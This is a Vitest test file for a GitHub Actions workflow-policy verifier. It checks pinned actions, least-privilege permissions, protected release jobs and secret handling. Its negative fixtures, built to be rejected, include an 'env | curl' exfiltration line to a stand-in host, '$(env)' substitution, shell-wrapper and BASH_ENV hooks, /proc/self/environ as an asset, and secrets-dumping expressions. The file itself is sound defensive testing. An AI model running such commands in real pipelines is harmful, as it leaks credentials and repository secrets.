import { execFile } from "node:child_process";
import { cp, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { promisify } from "node:util";

import { describe, expect, it } from "vitest";

const execFileAsync = promisify(execFile);
const repositoryRoot = resolve(import.meta.dirname, "../../..");
const verifier = resolve(repositoryRoot, "scripts/verify-workflows.mjs");

const pins = {
  checkout: "actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5",
  codeql: "github/codeql-action/init@ddf5ce7296213f5548c91e2dd19df2d77d2b2d66",
  dependencyReview:
    "actions/dependency-review-action@a1d282b36b6f3519aa1f3fc636f609c47dddb294",
  setupNode: "actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020",
} as const;

const readRepositoryFile = (path: string): Promise<string> =>
  readFile(resolve(repositoryRoot, path), "utf8");

const workflowPaths = [
  ".github/workflows/ci.yml",
  ".github/workflows/package-smoke.yml",
  ".github/workflows/codeql.yml",
] as const;

async function runVerifier(root = repositoryRoot) {
  return execFileAsync(process.execPath, [verifier, "--root", root], {
    cwd: repositoryRoot,
    encoding: "utf8",
  });
}

async function verifierFailure(root: string) {
  const failure: unknown = await runVerifier(root).then(
    () => undefined,
    (error: unknown) => error,
  );

  if (
    typeof failure !== "object" ||
    failure === null ||
    !("stderr" in failure) ||
    typeof failure.stderr !== "string"
  ) {
    throw new Error("Expected workflow verification to return stderr.");
  }

  expect("code" in failure ? failure.code : undefined).toBe(1);
  return failure.stderr;
}

const safeExtraWorkflow = `name: Extra

on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - run: echo safe
`;

const releasePolicySkeleton = `name: Release

on:
  workflow_dispatch:

permissions:
  contents: write
  id-token: write
  attestations: write

jobs:
  release:
    environment: release
    runs-on: ubuntu-latest
    steps:
      - run: echo verified
`;

const validReleaseCommand =
  'gh release create "${{ github.ref_name }}" --verify-tag';

const validFutureReleaseWorkflow = `name: Release

on:
  workflow_dispatch:
    inputs:
      publish_npm:
        type: boolean
        default: false

permissions:
  contents: write
  id-token: write
  attestations: write

jobs:
  release:
    environment: release
    runs-on: ubuntu-latest
    steps:
      - name: Check out source
        uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
        with:
          persist-credentials: false
      - name: Create the verified GitHub release
        env:
          GH_TOKEN: \${{ github.token }}
        run: ${validReleaseCommand}
  npm-publish:
    if: \${{ inputs.publish_npm }}
    needs: release
    environment: npm-publish
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
    steps:
      - name: Set up Node.js
        uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020
        with:
          node-version: 24
          registry-url: https://registry.npmjs.org
      - run: npm publish artifacts/package.tgz --provenance --access public
`;

async function withPolicyFixture<T>(
  callback: (fixtureRoot: string) => Promise<T>,
): Promise<T> {
  const fixtureRoot = await mkdtemp(join(tmpdir(), "workflow-policy-"));
  try {
    await cp(
      resolve(repositoryRoot, ".github"),
      resolve(fixtureRoot, ".github"),
      { recursive: true },
    );
    return await callback(fixtureRoot);
  } finally {
    await rm(fixtureRoot, { recursive: true, force: true });
  }
}

async function writeWorkflow(
  fixtureRoot: string,
  name: string,
  source: string,
): Promise<void> {
  await writeFile(
    resolve(fixtureRoot, ".github", "workflows", name),
    source,
    "utf8",
  );
}

function replaceJobDefinition(
  source: string,
  name: "release" | "npm-publish",
  value: string,
): string {
  const pattern = new RegExp(`^  ${name}:\\n(?: {4,}.*\\n)*`, "mu");
  const replacement = value.startsWith("\n")
    ? `  ${name}:${value}\n`
    : `  ${name}: ${value}\n`;
  const result = source.replace(pattern, replacement);
  if (result === source) {
    throw new Error(`Expected ${name} job fixture to be replaced.`);
  }
  return result;
}

describe("GitHub workflow policy", () => {
  it("tests Node 22 and 24 without live mutation credentials", async () => {
    const ci = await readRepositoryFile(workflowPaths[0]);

    expect(ci).toMatch(/node-version:\s*\[22, 24\]/);
    expect(ci).toMatch(/GITHUB_STARS_MCP_READ_ONLY:\s*["']?true["']?/);
    expect(ci).not.toMatch(
      /GITHUB_STARS_TOKEN|^\s*(?:GITHUB_TOKEN|GH_TOKEN):/m,
    );
    expect(ci).toMatch(/permissions:\s*\n\s+contents:\s*read/);
    expect(ci).toContain(pins.checkout);
    expect(ci).toContain(pins.setupNode);
    expect(ci).toContain(pins.dependencyReview);
    expect(ci).toContain("npm ci");
    expect(ci).toContain("npm run verify");
  });

  it("runs the packed-install contract on three operating systems and two Node versions", async () => {
    const smoke = await readRepositoryFile(workflowPaths[1]);

    expect(smoke).toContain("ubuntu-latest");
    expect(smoke).toContain("macos-latest");
    expect(smoke).toContain("windows-latest");
    expect(smoke).toMatch(/node-version:\s*\[22, 24\]/);
    expect(smoke).toContain("npm ci");
    expect(smoke).toContain("npm run build");
    expect(smoke).toContain("npm run package:verify");
    expect(smoke).toContain("--help");
    expect(smoke).toContain("--version");
    expect(smoke).toContain("--doctor");
    expect(smoke).toMatch(/fixture-backed/i);
  });

  it("runs pinned CodeQL and dependency review with least privilege", async () => {
    const [ci, codeql] = await Promise.all([
      readRepositoryFile(workflowPaths[0]),
      readRepositoryFile(workflowPaths[2]),
    ]);

    expect(ci).toContain(pins.dependencyReview);
    expect(codeql).toContain(pins.codeql.replace("/init@", "/analyze@"));
    expect(codeql).toContain(pins.codeql);
    expect(codeql).toMatch(
      /permissions:\s*\n\s+contents:\s*read\s*\n\s+security-events:\s*write/,
    );
    expect(codeql).not.toMatch(/^\s*(?:GITHUB_TOKEN|GH_TOKEN):/m);
  });

  it("pins every external action to a lowercase 40-character commit SHA", async () => {
    const workflows = await Promise.all(
      workflowPaths.map((path) => readRepositoryFile(path)),
    );
    const references = workflows.flatMap((source) =>
      [...source.matchAll(/^\s*(?:-\s+)?uses:\s*([^\s#]+)/gm)].map(
        (match) => match[1]!,
      ),
    );

    expect(references.length).toBeGreaterThan(0);
    for (const reference of references) {
      expect(reference).toMatch(
        /^(?:\.\/|[A-Za-z0-9_.-]+\/[A-Za-z0-9_./-]+@[0-9a-f]{40})$/,
      );
    }
  });

  it("configures weekly npm and GitHub Actions updates with bounded pull requests", async () => {
    const dependabot = await readRepositoryFile(".github/dependabot.yml");

    expect(dependabot).toContain("package-ecosystem: npm");
    expect(dependabot).toContain("package-ecosystem: github-actions");
    expect(dependabot.match(/interval:\s*weekly/g)).toHaveLength(2);
    expect(dependabot.match(/open-pull-requests-limit:\s*10/g)).toHaveLength(2);
  });

  it("passes the YAML-AST workflow policy verifier", async () => {
    const result = await runVerifier();

    expect(result.stderr).toBe("");
    expect(result.stdout).toMatch(
      /^Workflow policy check passed: \d+ workflows and 2 dependency ecosystems\.\n$/,
    );
  });

  it.each([
    {
      name: "a format wrapper around github.token",
      expression: "${{ format('{0}', github.token) }}",
    },
    {
      name: "toJSON of the complete secrets context",
      expression: "${{ toJSON(secrets) }}",
    },
    {
      name: "a bracketed secret",
      expression: "${{ secrets['DEPLOY_CREDENTIAL'] }}",
    },
    {
      name: "a dynamically indexed GitHub context",
      expression: "${{ github[format('{0}', 'token')] }}",
    },
    {
      name: "a numeric secrets index",
      expression: "${{ secrets[0] }}",
    },
    {
      name: "mixed-case bracket access",
      expression: "${{ SeCrEtS['DEPLOY_CREDENTIAL'] }}",
    },
    {
      name: "mixed-case GitHub token access",
      expression: "${{ GiThUb['ToKeN'] }}",
    },
    {
      name: "the complete GitHub context serialized as JSON",
      expression: "${{ toJSON(github) }}",
    },
    {
      name: "the bare complete GitHub context",
      expression: "${{ github }}",
    },
    {
      name: "a GitHub object filter serialized as JSON",
      expression: "${{ toJSON(github.*) }}",
    },
  ])("rejects $name in a non-release workflow", async ({ expression }) => {
    await withPolicyFixture(async (fixtureRoot) => {
      const target = resolve(fixtureRoot, workflowPaths[0]);
      const source = await readFile(target, "utf8");
      const marker = '  GITHUB_STARS_MCP_READ_ONLY: "true"';
      expect(source).toContain(marker);
      await writeFile(
        target,
        source.replace(
          marker,
          `${marker}\n  SAFE_VALUE: >-\n    ${expression}`,
        ),
        "utf8",
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain("(LIVE_TOKEN_REFERENCE)");
    });
  });

  it("rejects pull_request_target in every workflow", async () => {
    await withPolicyFixture(async (fixtureRoot) => {
      const target = resolve(fixtureRoot, workflowPaths[0]);
      const source = await readFile(target, "utf8");
      expect(source).toContain("  pull_request:\n");
      await writeFile(
        target,
        source.replace(
          "  pull_request:\n",
          "  pull_request:\n  pull_request_target:\n",
        ),
        "utf8",
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain("(PULL_REQUEST_TARGET_FORBIDDEN)");
    });
  });

  it.each(["nightly.yml", "release.yaml"])(
    "rejects unapproved workflow path %s",
    async (name) => {
      await withPolicyFixture(async (fixtureRoot) => {
        await writeWorkflow(
          fixtureRoot,
          name,
          name === "release.yaml" ? releasePolicySkeleton : safeExtraWorkflow,
        );

        const stderr = await verifierFailure(fixtureRoot);
        expect(stderr).toContain("(WORKFLOW_FORBIDDEN)");
      });
    },
  );

  it("rejects a release.yml disguised as an automatic release", async () => {
    await withPolicyFixture(async (fixtureRoot) => {
      await writeWorkflow(
        fixtureRoot,
        "release.yml",
        releasePolicySkeleton.replace(
          "  workflow_dispatch:\n",
          "  push:\n    branches: [main]\n",
        ),
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain("(RELEASE_TRIGGERS)");
    });
  });

  it("rejects release jobs without their protected environment", async () => {
    await withPolicyFixture(async (fixtureRoot) => {
      await writeWorkflow(
        fixtureRoot,
        "release.yml",
        releasePolicySkeleton.replace("    environment: release\n", ""),
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain("(RELEASE_ENVIRONMENT)");
    });
  });

  it("rejects release jobs with permissions broader than the exact minimum", async () => {
    await withPolicyFixture(async (fixtureRoot) => {
      await writeWorkflow(
        fixtureRoot,
        "release.yml",
        releasePolicySkeleton.replace(
          "    runs-on: ubuntu-latest\n",
          `    runs-on: ubuntu-latest
    permissions:
      contents: write
      id-token: write
      attestations: write
      packages: read
`,
        ),
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain("(RELEASE_PERMISSIONS)");
    });
  });

  it("rejects jobs outside the release and npm-publish allowlist", async () => {
    await withPolicyFixture(async (fixtureRoot) => {
      await writeWorkflow(
        fixtureRoot,
        "release.yml",
        `${releasePolicySkeleton}
  exfiltrate:
    environment: release
    runs-on: ubuntu-latest
    steps:
      - run: echo unsafe
`,
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain("(RELEASE_JOBS)");
    });
  });

  it.each([
    ["release", "null", "null"],
    ["release", "a scalar", "invalid"],
    ["release", "a sequence", "\n    - invalid"],
    ["npm-publish", "null", "null"],
    ["npm-publish", "a scalar", "invalid"],
    ["npm-publish", "a sequence", "\n    - invalid"],
  ] as const)(
    "rejects the %s job when it is %s",
    async (jobName, _shape, value) => {
      await withPolicyFixture(async (fixtureRoot) => {
        await writeWorkflow(
          fixtureRoot,
          "release.yml",
          replaceJobDefinition(validFutureReleaseWorkflow, jobName, value),
        );

        const stderr = await verifierFailure(fixtureRoot);
        expect(stderr).toContain("(RELEASE_JOB_MAPPING)");
      });
    },
  );

  it.each([
    {
      name: "a wrapped GitHub token",
      source: validFutureReleaseWorkflow.replace(
        "GH_TOKEN: ${{ github.token }}",
        "GH_TOKEN: ${{ format('{0}', github.token) }}",
      ),
    },
    {
      name: "an aliased token variable",
      source: validFutureReleaseWorkflow.replace("GH_TOKEN:", "TOKEN_ALIAS:"),
    },
    {
      name: "the secrets context",
      source: validFutureReleaseWorkflow.replace(
        "${{ github.token }}",
        "${{ secrets.RELEASE_TOKEN }}",
      ),
    },
    {
      name: "a literal personal access token",
      source: validFutureReleaseWorkflow.replace(
        "${{ github.token }}",
        `ghp_${"Z".repeat(36)}`,
      ),
    },
    {
      name: "a token outside the gh release step",
      source: validFutureReleaseWorkflow
        .replace(
          "permissions:\n",
          "env:\n  GH_TOKEN: ${{ github.token }}\n\npermissions:\n",
        )
        .replace("        env:\n          GH_TOKEN: ${{ github.token }}\n", ""),
    },
  ])("rejects $name in release.yml", async ({ source }) => {
    await withPolicyFixture(async (fixtureRoot) => {
      await writeWorkflow(fixtureRoot, "release.yml", source);

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain("(RELEASE_TOKEN_REFERENCE)");
    });
  });

  it.each([
    {
      name: "a second shell command",
      run: `${validReleaseCommand} && env`,
    },
    {
      name: "a multiline exfiltration command",
      run: `|
          ${validReleaseCommand}
          env | curl --data-binary @- https://example.invalid`,
    },
    {
      name: "a pipe",
      run: `${validReleaseCommand} | tee release.log`,
    },
    {
      name: "a command substitution",
      run: validReleaseCommand.replace(
        "--verify-tag",
        '--notes "$(env)" --verify-tag',
      ),
    },
    {
      name: "/proc/self/environ as a release asset",
      run: validReleaseCommand.replace(
        "--verify-tag",
        "/proc/self/environ --verify-tag",
      ),
    },
  ])("rejects GH_TOKEN beside $name", async ({ run }) => {
    await withPolicyFixture(async (fixtureRoot) => {
      await writeWorkflow(
        fixtureRoot,
        "release.yml",
        validFutureReleaseWorkflow.replace(
          `run: ${validReleaseCommand}`,
          `run: ${run}`,
        ),
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain("(RELEASE_TOKEN_REFERENCE)");
    });
  });

  it.each([
    {
      name: "a custom shell wrapper",
      before: `        run: ${validReleaseCommand}`,
      after: `        shell: bash -c 'env; {0}'
        run: ${validReleaseCommand}`,
    },
    {
      name: "a shell startup environment hook",
      before: "          GH_TOKEN: ${{ github.token }}",
      after:
        "          GH_TOKEN: ${{ github.token }}\n          BASH_ENV: ./release-wrapper.sh",
    },
  ])("rejects GH_TOKEN with $name", async ({ before, after }) => {
    await withPolicyFixture(async (fixtureRoot) => {
      await writeWorkflow(
        fixtureRoot,
        "release.yml",
        validFutureReleaseWorkflow.replace(before, after),
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain("(RELEASE_TOKEN_REFERENCE)");
    });
  });

  it("rejects release job defaults.run.shell wrappers", async () => {
    await withPolicyFixture(async (fixtureRoot) => {
      await writeWorkflow(
        fixtureRoot,
        "release.yml",
        validFutureReleaseWorkflow.replace(
          "    runs-on: ubuntu-latest\n",
          `    runs-on: ubuntu-latest
    defaults:
      run:
        shell: bash -c 'env; {0}'
`,
        ),
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain("(RELEASE_SHELL_POLICY)");
    });
  });

  it.each([
    {
      name: "a missing checkout step",
      before: `      - name: Check out source
        uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
        with:
          persist-credentials: false
`,
      after: "",
      code: "RELEASE_CHECKOUT_REQUIRED",
    },
    {
      name: "missing persist-credentials",
      before: `        with:
          persist-credentials: false
`,
      after: "",
      code: "CHECKOUT_CREDENTIAL_PERSISTENCE",
    },
    {
      name: "persist-credentials enabled",
      before: "          persist-credentials: false",
      after: "          persist-credentials: true",
      code: "CHECKOUT_CREDENTIAL_PERSISTENCE",
    },
  ])("rejects release checkout with $name", async (fixture) => {
    await withPolicyFixture(async (fixtureRoot) => {
      expect(validFutureReleaseWorkflow).toContain(fixture.before);
      await writeWorkflow(
        fixtureRoot,
        "release.yml",
        validFutureReleaseWorkflow.replace(fixture.before, fixture.after),
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain(`(${fixture.code})`);
    });
  });

  it("accepts the future Task 7 manually gated release workflow", async () => {
    await withPolicyFixture(async (fixtureRoot) => {
      await writeWorkflow(
        fixtureRoot,
        "release.yml",
        validFutureReleaseWorkflow,
      );

      const result = await runVerifier(fixtureRoot);
      expect(result.stderr).toBe("");
      expect(result.stdout).toBe(
        "Workflow policy check passed: 4 workflows and 2 dependency ecosystems.\n",
      );
    });
  });

  it.each([
    {
      name: "an include entry",
      addition: `
        include:
          - os: ubuntu-latest
            node-version: 22
            experimental: true`,
    },
    {
      name: "a self-hosted include entry",
      addition: `
        include:
          - os: self-hosted
            node-version: 22`,
    },
    {
      name: "an exclude entry",
      addition: `
        exclude:
          - os: windows-latest
            node-version: 24`,
    },
    {
      name: "an extra architecture dimension",
      addition: `
        architecture: [x64]`,
    },
  ])("rejects a package matrix with $name", async ({ addition }) => {
    await withPolicyFixture(async (fixtureRoot) => {
      const target = resolve(fixtureRoot, workflowPaths[1]);
      const source = await readFile(target, "utf8");
      const marker = "        node-version: [22, 24]";
      expect(source).toContain(marker);
      await writeFile(
        target,
        source.replace(marker, `${marker}${addition}`),
        "utf8",
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain("(PACKAGE_MATRIX_SHAPE)");
    });
  });

  it.each([
    {
      name: "a job-level if expression",
      before: "    timeout-minutes: 25\n",
      after: "    timeout-minutes: 25\n    if: ${{ false }}\n",
    },
    {
      name: "job-level continue-on-error set to false",
      before: "    timeout-minutes: 25\n",
      after: "    timeout-minutes: 25\n    continue-on-error: false\n",
    },
    {
      name: "a required-step if set to false",
      before: "        run: npm run package:verify\n",
      after: "        if: false\n        run: npm run package:verify\n",
    },
    {
      name: "a required-step continue-on-error expression",
      before: "        run: npm run package:verify\n",
      after:
        "        continue-on-error: ${{ false }}\n        run: npm run package:verify\n",
    },
  ])("rejects package smoke with $name", async ({ before, after }) => {
    await withPolicyFixture(async (fixtureRoot) => {
      const target = resolve(fixtureRoot, workflowPaths[1]);
      const source = await readFile(target, "utf8");
      expect(source).toContain(before);
      await writeFile(target, source.replace(before, after), "utf8");

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain("(PACKAGE_EXECUTION_POLICY)");
    });
  });

  it.each([
    {
      name: "an unpinned action",
      path: ".github/workflows/ci.yml",
      before: pins.checkout,
      after: "actions/checkout@v4",
      code: "UNPINNED_ACTION",
    },
    {
      name: "a broad write permission",
      path: ".github/workflows/ci.yml",
      before: "contents: read",
      after: "contents: write",
      code: "PERMISSION_WRITE_FORBIDDEN",
    },
    {
      name: "a live mutation token",
      path: ".github/workflows/ci.yml",
      before: 'GITHUB_STARS_MCP_READ_ONLY: "true"',
      after:
        'GITHUB_STARS_MCP_READ_ONLY: "true"\n  GITHUB_STARS_TOKEN: "ghp_FICTIONAL_VALUE_MUST_NOT_PRINT"',
      code: "LIVE_TOKEN_REFERENCE",
    },
    {
      name: "a disabled read-only gate",
      path: ".github/workflows/ci.yml",
      before: 'GITHUB_STARS_MCP_READ_ONLY: "true"',
      after: 'GITHUB_STARS_MCP_READ_ONLY: "false"',
      code: "READ_ONLY_REQUIRED",
    },
    {
      name: "an incomplete Node matrix",
      path: ".github/workflows/ci.yml",
      before: "node-version: [22, 24]",
      after: "node-version: [24]",
      code: "CI_NODE_MATRIX",
    },
    {
      name: "an unbounded dependency queue",
      path: ".github/dependabot.yml",
      before: "open-pull-requests-limit: 10",
      after: "open-pull-requests-limit: 11",
      code: "DEPENDABOT_PULL_REQUEST_LIMIT",
    },
    {
      name: "a YAML anchor",
      path: ".github/workflows/ci.yml",
      before: 'env:\n  GITHUB_STARS_MCP_READ_ONLY: "true"',
      after:
        'x-read-only: &read-only "true"\nenv:\n  GITHUB_STARS_MCP_READ_ONLY: "true"',
      code: "YAML_ANCHOR_FORBIDDEN",
    },
    {
      name: "an anchored Node matrix",
      path: ".github/workflows/ci.yml",
      before: "matrix:\n        node-version: [22, 24]",
      after: "matrix: &node-matrix\n        node-version: [22, 24]",
      code: "YAML_ANCHOR_FORBIDDEN",
    },
    {
      name: "an anchored action reference",
      path: ".github/workflows/ci.yml",
      before: pins.checkout,
      after: `&checkout-action ${pins.checkout}`,
      code: "YAML_ANCHOR_FORBIDDEN",
    },
    {
      name: "a YAML alias",
      path: ".github/workflows/ci.yml",
      before: 'env:\n  GITHUB_STARS_MCP_READ_ONLY: "true"',
      after:
        'x-ci-env: &ci-env\n  GITHUB_STARS_MCP_READ_ONLY: "true"\nenv: *ci-env',
      code: "YAML_ALIAS_FORBIDDEN",
    },
    {
      name: "a YAML merge key",
      path: ".github/workflows/ci.yml",
      before: 'env:\n  GITHUB_STARS_MCP_READ_ONLY: "true"',
      after:
        'x-shared-env: &shared-env\n  SAFE_FLAG: "true"\nenv:\n  <<: *shared-env\n  GITHUB_STARS_MCP_READ_ONLY: "true"',
      code: "YAML_MERGE_KEY_FORBIDDEN",
    },
    {
      name: "a custom YAML tag",
      path: ".github/workflows/ci.yml",
      before: 'GITHUB_STARS_MCP_READ_ONLY: "true"',
      after: 'GITHUB_STARS_MCP_READ_ONLY: !unsafe "true"',
      code: "YAML_CUSTOM_TAG_FORBIDDEN",
    },
    {
      name: "a dynamic YAML mapping key",
      path: ".github/workflows/ci.yml",
      before: 'env:\n  GITHUB_STARS_MCP_READ_ONLY: "true"',
      after:
        'env:\n  GITHUB_STARS_MCP_READ_ONLY: "true"\n  ? [GITHUB_STARS_TOKEN]\n  : "hidden"',
      code: "YAML_DYNAMIC_KEY_FORBIDDEN",
    },
  ])("rejects $name without echoing source values", async (fixture) => {
    const fixtureRoot = await mkdtemp(join(tmpdir(), "workflow-policy-"));
    try {
      await cp(
        resolve(repositoryRoot, ".github"),
        resolve(fixtureRoot, ".github"),
        { recursive: true },
      );
      const target = resolve(fixtureRoot, fixture.path);
      const source = await readFile(target, "utf8");
      expect(source).toContain(fixture.before);
      await writeFile(
        target,
        source.replace(fixture.before, fixture.after),
        "utf8",
      );

      const stderr = await verifierFailure(fixtureRoot);
      expect(stderr).toContain(`(${fixture.code})`);
      expect(stderr).not.toContain("ghp_FICTIONAL_VALUE_MUST_NOT_PRINT");
    } finally {
      await rm(fixtureRoot, { recursive: true, force: true });
    }
  });
});
